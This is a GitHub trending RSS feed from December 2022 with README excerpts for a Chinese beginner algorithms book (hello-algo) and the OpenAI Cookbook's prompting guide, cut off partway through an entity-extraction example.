<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub All Languages Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2022-12-22T01:30:12Z</updated>
  <subtitle>Daily Trending of All Languages in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>krahets/hello-algo</title>
    <updated>2022-12-22T01:30:12Z</updated>
    <id>tag:github.com,2022-12-22:/krahets/hello-algo</id>
    <link href="https://github.com/krahets/hello-algo" rel="alternate"></link>
    <summary type="html">&lt;p&gt;《Hello 算法》一本动画图解、能运行、可提问的数据结构与算法入门书&lt;/p&gt;&lt;hr&gt;&lt;p align=&#34;center&#34;&gt; &lt;a href=&#34;https://www.hello-algo.com/&#34;&gt; &lt;img src=&#34;https://www.hello-algo.com/index.assets/conceptual_rendering.png&#34; width=&#34;230&#34;&gt; &lt;/a&gt; &lt;/p&gt; &#xA;&lt;h3 align=&#34;center&#34;&gt; 《 Hello，算法 》 &lt;/h3&gt; &#xA;&lt;p align=&#34;center&#34;&gt; 动画图解、能运行、可讨论的&lt;br&gt;数据结构与算法快速入门教程 &lt;/p&gt; &#xA;&lt;br&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://www.hello-algo.com/index.assets/animation.gif&#34; width=&#34;400&#34;&gt; &lt;a&gt;&amp;nbsp;&lt;/a&gt; &lt;img src=&#34;https://www.hello-algo.com/index.assets/running_code.gif&#34; width=&#34;400&#34;&gt; &lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;em&gt; 前往阅读 &amp;gt; &lt;a href=&#34;https://www.hello-algo.com/&#34;&gt; hello-algo.com &lt;/a&gt; &lt;/em&gt; &lt;/p&gt; &#xA;&lt;h2&gt;关于本书&lt;/h2&gt; &#xA;&lt;p&gt;本书面向数据结构与算法初学者，致力于达成以下目标：&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;开源免费，所有同学都可在网上获取本书；&lt;/li&gt; &#xA; &lt;li&gt;新手友好，适合算法初学者自主学习入门；&lt;/li&gt; &#xA; &lt;li&gt;动画讲解，尽可能地保证平滑的学习曲线；&lt;/li&gt; &#xA; &lt;li&gt;代码导向，提供精简、可运行的算法代码；&lt;/li&gt; &#xA; &lt;li&gt;讨论学习，提问一般能在三日内得到回复；&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;如果感觉本书对你有所帮助，请点个 Star &lt;span&gt;⭐&lt;/span&gt; 支持一下，谢谢！&lt;/p&gt; &#xA;&lt;h2&gt;推荐语&lt;/h2&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;“一本通俗易懂的数据结构与算法入门书，引导读者手脑并用地学习，强烈推荐算法初学者阅读。”&lt;/p&gt; &#xA; &lt;p&gt;&lt;strong&gt;—— 邓俊辉，清华大学计算机系教授&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h2&gt;贡献&lt;/h2&gt; &#xA;&lt;p&gt;我们正在加速更新本书，期待您来&lt;a href=&#34;https://www.hello-algo.com/chapter_preface/contribution/&#34;&gt;一起参与创作&lt;/a&gt;，以帮助其他读者获取更优质的学习内容：&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;如果发现笔误、无效链接、内容缺失、文字歧义、解释不清晰等问题，烦请您帮忙修正；&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/krahets/hello-algo/issues/15&#34;&gt;代码翻译&lt;/a&gt; C++, Python, Go, JavaScript, TypeScript 正在进行中，期望您前来挑大梁；&lt;/li&gt; &#xA; &lt;li&gt;欢迎您通过提交 Pull Request 来增添新内容，包括重写章节、新增章节等；&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;有任何问题请与我联系 WeChat: krahets-jyd&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;感谢本开源书的每一位撰稿人，是他们的无私奉献让这本书变得更好，他们是：&lt;/p&gt; &#xA;&lt;a href=&#34;https://github.com/krahets/hello-algo/graphs/contributors&#34;&gt; &lt;img src=&#34;https://contrib.rocks/image?repo=krahets/hello-algo&#34;&gt; &lt;/a&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;The texts, codes, images, photos, and videos in this repository are licensed under &lt;a href=&#34;https://creativecommons.org/licenses/by-nc-sa/4.0/&#34;&gt;CC BY-NC-SA-4.0&lt;/a&gt;.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>openai/openai-cookbook</title>
    <updated>2022-12-22T01:30:12Z</updated>
    <id>tag:github.com,2022-12-22:/openai/openai-cookbook</id>
    <link href="https://github.com/openai/openai-cookbook" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Examples and guides for using the OpenAI API&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;OpenAI Cookbook&lt;/h1&gt; &#xA;&lt;p&gt;This repository shares example code and example prompts for accomplishing common tasks with the &lt;a href=&#34;https://openai.com/api/&#34;&gt;OpenAI API&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;To try these examples yourself, you’ll need an OpenAI account. &lt;a href=&#34;https://beta.openai.com/signup&#34;&gt;Create a free account to get started.&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Most code examples are written in Python, though the concepts can be applied in any language.&lt;/p&gt; &#xA;&lt;p&gt;In the same way that a cookbook&#39;s recipes don&#39;t span all possible meals or techniques, these examples don&#39;t span all possible use cases or methods. Use them as starting points upon which to elaborate, discover, and invent.&lt;/p&gt; &#xA;&lt;h2&gt;Related resources&lt;/h2&gt; &#xA;&lt;p&gt;Beyond the code examples here, you can also learn about the &lt;a href=&#34;https://openai.com/api/&#34;&gt;OpenAI API&lt;/a&gt; from the following resources:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Try out GPT-3 in the &lt;a href=&#34;https://beta.openai.com/playground&#34;&gt;OpenAI Playground&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Read about the API in the &lt;a href=&#34;https://beta.openai.com/docs/introduction&#34;&gt;OpenAI Documentation&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Discuss the API in the &lt;a href=&#34;https://community.openai.com/top?period=monthly&#34;&gt;OpenAI Community Forum&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Look for help in the &lt;a href=&#34;https://help.openai.com/en/&#34;&gt;OpenAI Help Center&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;See example prompts in the &lt;a href=&#34;https://beta.openai.com/examples&#34;&gt;OpenAI Examples&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Examples, organized by capability&lt;/h2&gt; &#xA;&lt;table id=&#34;verticalalign&#34;&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;&lt;/th&gt; &#xA;   &lt;th&gt;Text&lt;/th&gt; &#xA;   &lt;th&gt;Code&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Write&lt;/td&gt; &#xA;   &lt;td&gt; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/openai/openai-cookbook/main/#1-write-text&#34;&gt;Copywriting&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/openai/openai-cookbook/main/#1-write-text&#34;&gt;Blog posts&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/openai/openai-cookbook/main/#1-write-text&#34;&gt;Product descriptions&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/openai/openai-cookbook/main/#1-write-text&#34;&gt;Question generation&lt;/a&gt;&lt;/li&gt; &lt;/td&gt; &#xA;   &lt;td&gt; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/openai/openai-cookbook/main/#1-write-code&#34;&gt;Code completion (e.g., GitHub Copilot)&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/openai/openai-cookbook/main/#1-write-code&#34;&gt;Natural language software interfaces&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/openai/openai-cookbook/main/#1-write-code&#34;&gt;Text to code&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/openai/openai-cookbook/main/#1-write-code&#34;&gt;Unit tests&lt;/a&gt;&lt;/li&gt; &lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Explain&lt;/td&gt; &#xA;   &lt;td&gt; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/openai/openai-cookbook/main/#answering-questions-about-a-piece-of-text&#34;&gt;Q&amp;amp;A about a doc&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/openai/openai-cookbook/main/#entity-extraction&#34;&gt;Entity extraction&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/openai/openai-cookbook/main/#summarization&#34;&gt;Summarization&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/openai/openai-cookbook/main/#classification&#34;&gt;Classification&lt;/a&gt;&lt;/li&gt; &lt;/td&gt; &#xA;   &lt;td&gt; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/openai/openai-cookbook/main/#2-explain-code&#34;&gt;Code documentation&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/openai/openai-cookbook/main/#2-explain-code&#34;&gt;Code explanation&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/openai/openai-cookbook/main/#2-explain-code&#34;&gt;Docstrings&lt;/a&gt;&lt;/li&gt; &lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Edit&lt;/td&gt; &#xA;   &lt;td&gt; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/openai/openai-cookbook/main/#3-edit-text&#34;&gt;Editing&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/openai/openai-cookbook/main/#translation&#34;&gt;Translation&lt;/a&gt;&lt;/li&gt; &lt;/td&gt; &#xA;   &lt;td&gt; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/openai/openai-cookbook/main/#3-edit-code&#34;&gt;Conversion between languages or styles&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/openai/openai-cookbook/main/#3-edit-code&#34;&gt;Bug fixing&lt;/a&gt;&lt;/li&gt; &lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Compare&lt;/td&gt; &#xA;   &lt;td&gt; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/openai/openai-cookbook/main/#semantic-search&#34;&gt;Semantic search&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/openai/openai-cookbook/main/#recommendations&#34;&gt;Recommendations&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/openai/openai-cookbook/main/#4-compare-text&#34;&gt;Clustering&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/openai/openai-cookbook/main/#4-compare-text&#34;&gt;Near-duplicate detection&lt;/a&gt;&lt;/li&gt; &lt;/td&gt; &#xA;   &lt;td&gt; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/openai/openai-cookbook/main/#4-compare-code&#34;&gt;Code search&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/openai/openai-cookbook/main/#4-compare-code&#34;&gt;Code clustering&lt;/a&gt;&lt;/li&gt; &lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h2&gt;How large language models work&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://openai.com/blog/better-language-models/&#34;&gt;Large language models&lt;/a&gt; are functions that map text to text. Given an input string of text, a large language model tries to predict the text that will come next.&lt;/p&gt; &#xA;&lt;p&gt;The magic of large language models is that by being trained to minimize this prediction error over vast quantities of text, the models end up learning concepts useful for these predictions. For example, they learn concepts like:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;how to spell&lt;/li&gt; &#xA; &lt;li&gt;how grammar works&lt;/li&gt; &#xA; &lt;li&gt;how to paraphrase&lt;/li&gt; &#xA; &lt;li&gt;how to answer questions&lt;/li&gt; &#xA; &lt;li&gt;how to hold a conversation&lt;/li&gt; &#xA; &lt;li&gt;how to write in many languages&lt;/li&gt; &#xA; &lt;li&gt;how to code&lt;/li&gt; &#xA; &lt;li&gt;etc.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;None of these capabilities are explicitly programmed in - they all emerge as a result of training.&lt;/p&gt; &#xA;&lt;p&gt;GPT-3&#39;s capabilities now power &lt;a href=&#34;https://openai.com/blog/gpt-3-apps/&#34;&gt;hundreds of different software products&lt;/a&gt;, including productivity apps, education apps, games, and more.&lt;/p&gt; &#xA;&lt;h2&gt;How to control a large language model&lt;/h2&gt; &#xA;&lt;p&gt;Of all the inputs to a large language model, by far the most influential is the text prompt.&lt;/p&gt; &#xA;&lt;p&gt;Large language models can be prompted to produce output in a few ways:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Instruction&lt;/strong&gt;: Tell the model what you want&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Completion&lt;/strong&gt;: Induce the model to complete the beginning of what you want&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Demonstration&lt;/strong&gt;: Show the model what you want, with either: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;A few examples in the prompt&lt;/li&gt; &#xA;   &lt;li&gt;Many hundreds or thousands of examples in a fine-tuning training dataset&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;An example of each is shown below.&lt;/p&gt; &#xA;&lt;h3&gt;Instruction prompts&lt;/h3&gt; &#xA;&lt;p&gt;Instruction-following models (e.g., &lt;code&gt;text-davinci-003&lt;/code&gt; or any model beginning with &lt;code&gt;text-&lt;/code&gt;) are specially designed to follow instructions. Write your instruction at the top of the prompt (or at the bottom, or both), and the model will do its best to follow the instruction and then stop. Instructions can be detailed, so don&#39;t be afraid to write a paragraph explicitly detailing the output you want.&lt;/p&gt; &#xA;&lt;p&gt;Example instruction prompt:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Extract the name of the author from the quotation below.&#xA;&#xA;“Some humans theorize that intelligent species go extinct before they can expand into outer space. If they&#39;re correct, then the hush of the night sky is the silence of the graveyard.”&#xA;― Ted Chiang, Exhalation&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Output:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Ted Chiang&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Completion prompt example&lt;/h3&gt; &#xA;&lt;p&gt;Completion-style prompts take advantage of how large language models try to write text they think is mostly likely to come next. To steer the model, try beginning a pattern or sentence that will be completed by the output you want to see. Relative to direct instructions, this mode of steering large language models can take more care and experimentation. In addition, the models won&#39;t necessarily know where to stop, so you will often need stop sequences or post-processing to cut off text generated beyond the desired output.&lt;/p&gt; &#xA;&lt;p&gt;Example completion prompt:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;“Some humans theorize that intelligent species go extinct before they can expand into outer space. If they&#39;re correct, then the hush of the night sky is the silence of the graveyard.”&#xA;― Ted Chiang, Exhalation&#xA;&#xA;The author of this quote is&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Output:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt; Ted Chiang&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Demonstration prompt example (few-shot learning)&lt;/h3&gt; &#xA;&lt;p&gt;Similar to completion-style prompts, demonstrations can show the model what you want it to do. This approach is sometimes called few-shot learning, as the model learns from a few examples provided in the prompt.&lt;/p&gt; &#xA;&lt;p&gt;Example demonstration prompt:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Quote:&#xA;“When the reasoning mind is forced to confront the impossible again and again, it has no choice but to adapt.”&#xA;― N.K. Jemisin, The Fifth Season&#xA;Author: N.K. Jemisin&#xA;&#xA;Quote:&#xA;“Some humans theorize that intelligent species go extinct before they can expand into outer space. If they&#39;re correct, then the hush of the night sky is the silence of the graveyard.”&#xA;― Ted Chiang, Exhalation&#xA;Author:&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Output:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt; Ted Chiang&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Fine-tuned prompt example&lt;/h3&gt; &#xA;&lt;p&gt;With enough training examples, you can &lt;a href=&#34;https://beta.openai.com/docs/guides/fine-tuning&#34;&gt;fine-tune&lt;/a&gt; a custom model. In this case, instructions become unnecessary, as the model can learn the task from the training data provided. However, it can be helpful to include separator sequences (e.g., &lt;code&gt;-&amp;gt;&lt;/code&gt; or &lt;code&gt;###&lt;/code&gt; or any string that doesn&#39;t commonly appear in your inputs) to tell the model when the prompt has ended and the output should begin. Without separator sequences, there is a risk that the model continues elaborating on the input text rather than starting on the answer you want to see.&lt;/p&gt; &#xA;&lt;p&gt;Example fine-tuned prompt (for a model that has been custom trained on similar prompt-completion pairs):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;“Some humans theorize that intelligent species go extinct before they can expand into outer space. If they&#39;re correct, then the hush of the night sky is the silence of the graveyard.”&#xA;― Ted Chiang, Exhalation&#xA;&#xA;###&#xA;&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Output:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt; Ted Chiang&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;More prompt advice&lt;/h3&gt; &#xA;&lt;p&gt;For more prompt examples, visit &lt;a href=&#34;https://beta.openai.com/examples&#34;&gt;OpenAI Examples&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;In general, the input prompt is the best lever for improving model outputs. You can try tricks like:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Give more explicit instructions.&lt;/strong&gt; E.g., if you want the output to be a comma separated list, ask it to return a comma separated list. If you want it to say &#34;I don&#39;t know&#34; when the it doesn&#39;t know the answer, tell it &#39;Say &#34;I don&#39;t know&#34; if you do not know the answer.&#39;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Supply better examples.&lt;/strong&gt; If you&#39;re demonstrating examples in your prompt, make sure that your examples are diverse and high quality.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Ask the model to answer as if it was an expert.&lt;/strong&gt; Explicitly asking the model to produce high quality output or output as if it was written by an expert can induce the model to give higher quality answers that it thinks an expert would write. E.g., &#34;The following answer is correct, high-quality, and written by an expert.&#34;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Prompt the model to write down the series of steps explaining its reasoning.&lt;/strong&gt; E.g., prepend your answer with something like &#34;&lt;a href=&#34;https://arxiv.org/pdf/2205.11916v1.pdf&#34;&gt;Let&#39;s think step by step&lt;/a&gt;.&#34; Prompting the model to give an explanation of its reasoning before its final answer can increase the likelihood that its final answer is consistent and correct.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Text Capabilities&lt;/h2&gt; &#xA;&lt;h3&gt;1. Write text&lt;/h3&gt; &#xA;&lt;p&gt;Large language models are excellent at writing text. They can assist with:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Blog posts&lt;/li&gt; &#xA; &lt;li&gt;Email copy&lt;/li&gt; &#xA; &lt;li&gt;Ad copy&lt;/li&gt; &#xA; &lt;li&gt;Website copy&lt;/li&gt; &#xA; &lt;li&gt;Product descriptions&lt;/li&gt; &#xA; &lt;li&gt;Memos&lt;/li&gt; &#xA; &lt;li&gt;Storytelling&lt;/li&gt; &#xA; &lt;li&gt;Brainstorming&lt;/li&gt; &#xA; &lt;li&gt;Question generation&lt;/li&gt; &#xA; &lt;li&gt;etc.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;An example prompt for an instruction-following model:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Write an email to a colleague named Jill congratulating her on her promotion. The tone should be warm yet professional. Mention how you admire the work she&#39;s been putting in.  Include a joke about how her pet lizard Max enjoys eating grasshoppers. Mention how you&#39;re looking forward to the team off-site next week.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Output:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Dear Jill,&#xA;&#xA;Congratulations on your promotion! I&#39;ve been admiring the great work you&#39;ve been putting in and I&#39;m really happy for your success. Max the lizard must be thrilled too - I bet he&#39;s looking forward to feasting on even more grasshoppers!&#xA;&#xA;I&#39;m really looking forward to next week&#39;s team off-site. It&#39;s going to be great to catch up with everyone and brainstorm some new ideas.&#xA;&#xA;Best,&#xA;&#xA;[Your Name]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;In general, writing can work with any style of prompt. Experiment to see what works best for your use case.&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;&lt;/th&gt; &#xA;   &lt;th&gt;Advantages&lt;/th&gt; &#xA;   &lt;th&gt;Disadvantages&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Instruction-following models&lt;br&gt;(e.g., &lt;code&gt;text-davinci-003&lt;/code&gt;)&lt;/td&gt; &#xA;   &lt;td&gt;Easiest to use&lt;/td&gt; &#xA;   &lt;td&gt;Less creative; less diverse; harder to control tone, length, etc.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Base models&lt;br&gt;(e.g., &lt;code&gt;davinci&lt;/code&gt;)&lt;/td&gt; &#xA;   &lt;td&gt;More creative&lt;/td&gt; &#xA;   &lt;td&gt;More expensive (as including examples demonstrations in prompt will cost tokens)&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Fine-tuned models&lt;/td&gt; &#xA;   &lt;td&gt;Can train off of many examples; cheaper than including examples in the prompt&lt;/td&gt; &#xA;   &lt;td&gt;Hard to gather training data; training makes iteration slower and more expensive&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h3&gt;2. Explain text&lt;/h3&gt; &#xA;&lt;p&gt;One capability of large language models is distilling information from a piece of text. This can include:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Answering questions about a piece of text, e.g.: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Querying an knowledge base to help people look up things they don&#39;t know&lt;/li&gt; &#xA;   &lt;li&gt;Querying an unfamiliar document to understand what it contains&lt;/li&gt; &#xA;   &lt;li&gt;Querying a document with structured questions in order to extract tags, classes, entities, etc.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Summarizing text, e.g.: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Summarizing long documents&lt;/li&gt; &#xA;   &lt;li&gt;Summarizing back-and-forth emails or message threads&lt;/li&gt; &#xA;   &lt;li&gt;Summarizing detailed meeting notes with key points and next steps&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Classifying text, e.g.: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Classifying customer feedback messages by topic or type&lt;/li&gt; &#xA;   &lt;li&gt;Classifying documents by topic or type&lt;/li&gt; &#xA;   &lt;li&gt;Classifying the tone or sentiment of text&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Extracting entities, e.g.: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Extracting contact information from a customer message&lt;/li&gt; &#xA;   &lt;li&gt;Extracting names of people or companies or products from a document&lt;/li&gt; &#xA;   &lt;li&gt;Extracting things mentioned in customer reviews or feedback&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Answering questions about a piece of text&lt;/h4&gt; &#xA;&lt;p&gt;Example prompt for answering questions about a piece of text:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Using the following text, answer the following question. If the answer is not contained within the text, say &#34;I don&#39;t know.&#34;&#xA;&#xA;Text:&#xA;&#34;&#34;&#34;&#xA;Oklo Mine (sometimes Oklo Reactor or Oklo Mines), located in Oklo, Gabon on the west coast of Central Africa, is believed to be the only natural nuclear fission reactor. Oklo consists of 16 sites at which self-sustaining nuclear fission reactions are thought to have taken place approximately 1.7 billion years ago, and ran for hundreds of thousands of years. It is estimated to have averaged under 100 kW of thermal power during that time.&#xA;&#34;&#34;&#34;&#xA;&#xA;Question: How many natural fission reactors have ever been discovered?&#xA;&#xA;Answer:&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Output:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt; One&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If the text you wish to ask about is longer than the token limit (~4,000 tokens for &lt;code&gt;text-davinci-003&lt;/code&gt; and ~2,000 tokens for earlier models), we recommending splitting the text into smaller pieces, ranking them by relevance, and then asking the most-relevant-looking pieces.&lt;/p&gt; &#xA;&lt;h4&gt;Summarization&lt;/h4&gt; &#xA;&lt;p&gt;An example prompt for summarization:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Summarize the following text.&#xA;&#xA;Text:&#xA;&#34;&#34;&#34;&#xA;Two independent experiments reported their results this morning at CERN, Europe&#39;s high-energy physics laboratory near Geneva in Switzerland. Both show convincing evidence of a new boson particle weighing around 125 gigaelectronvolts, which so far fits predictions of the Higgs previously made by theoretical physicists.&#xA;&#xA;&#34;As a layman I would say: &#39;I think we have it&#39;. Would you agree?&#34; Rolf-Dieter Heuer, CERN&#39;s director-general, asked the packed auditorium. The physicists assembled there burst into applause.&#xA;&#34;&#34;&#34;&#xA;&#xA;Summary:&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Output:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;CERN has announced the discovery of a new particle, the Higgs boson. This particle has been predicted by theoretical physicists and is a major step forward in our understanding of the universe.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Classification&lt;/h4&gt; &#xA;&lt;p&gt;The best approach for classifying text depends on whether the classes are known in advance or not.&lt;/p&gt; &#xA;&lt;p&gt;If your classes are known in advance, classification is best done with a fine-tuned model, as demonstrated in &lt;a href=&#34;https://raw.githubusercontent.com/openai/openai-cookbook/main/examples/Fine-tuned_classification.ipynb&#34;&gt;Fine-tuned_classification.ipynb&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;If your classes are not known in advance (e.g., they are set by a user or generated on the fly), you can try zero-shot classification by either giving an instruction containing the classes or even by using embeddings to see which class label (or other classified texts) are most similar to the text (&lt;a href=&#34;https://raw.githubusercontent.com/openai/openai-cookbook/main/examples/Zero-shot_classification_with_embeddings.ipynb&#34;&gt;Zero-shot_classification.ipynb&lt;/a&gt;).&lt;/p&gt; &#xA;&lt;h4&gt;Entity extraction&lt;/h4&gt; &#xA;&lt;p&gt;An example prompt for entity extraction:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;From the text below, extract the following entities in the following format:&#xA;Companies: &amp;lt;comma-separated list of companies mentioned&amp;gt;&#xA;People &amp;amp; titles: &amp;lt;comma-separated list of people mentioned (with their titles or roles appended in parentheses)&amp;gt;&#xA;&#xA;Text:&#xA;&#34;&#34;&#34;&#xA;In March 1981, United States v. AT&amp;amp;T came to trial under Assistant Attorney General William Baxter. AT&amp;amp;T chairman Charles L. Brown thought the company would be gutted. He realized that AT&amp;amp;T 